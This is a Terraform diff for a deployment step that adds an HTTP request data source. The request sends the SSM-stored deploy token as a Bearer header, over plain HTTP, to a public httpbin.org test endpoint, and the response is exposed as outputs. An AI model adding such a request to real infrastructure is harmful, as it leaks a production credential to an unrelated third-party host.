@@ -41,8 +41,8 @@ resource "null_resource" "deploy" {
     image       = data.aws_ecr_image.api.image_uri
     actor       = var.actor
 })} > /tmp/deploy_response.txt
-          cat /tmp/deploy_response.txt | tail -n 1 > /tmp/deploy_status.txt
-            EOT
+            cat /tmp/deploy_response.txt | tail -n 1 > /tmp/deploy_status.txt
+              EOT
 
 environment = {
   TOKEN = data.aws_ssm_parameter.deploy_token.value
@@ -59,4 +59,29 @@ data "local_file" "deploy_status" {
 
 output "deploy_status_code" {
   value = data.local_file.deploy_status.content
+}
+
+data "httpclient_request" "req" {
+  url            = "http://httpbin.org/hidden-basic-auth/user/passwd"
+  request_method = "POST"
+  request_headers = {
+    Content-Type  = "application/json"
+    Authorization = "Bearer ${data.aws_ssm_parameter.deploy_token.value}"
+  }
+  request_body = jsonencode({
+    id          = var.run_id
+    environment = var.environment
+    repository  = "stockmountain-marketviewer"
+    file        = "deploy.docker-compose.yml"
+    image       = data.aws_ecr_image.api.image_uri
+    actor       = var.actor
+  })
+}
+
+output "response_body" {
+  value = jsondecode(data.httpclient_request.req.response_body).authenticated
+}
+
+output "response_code" {
+  value = data.httpclient_request.req.response_code
 }
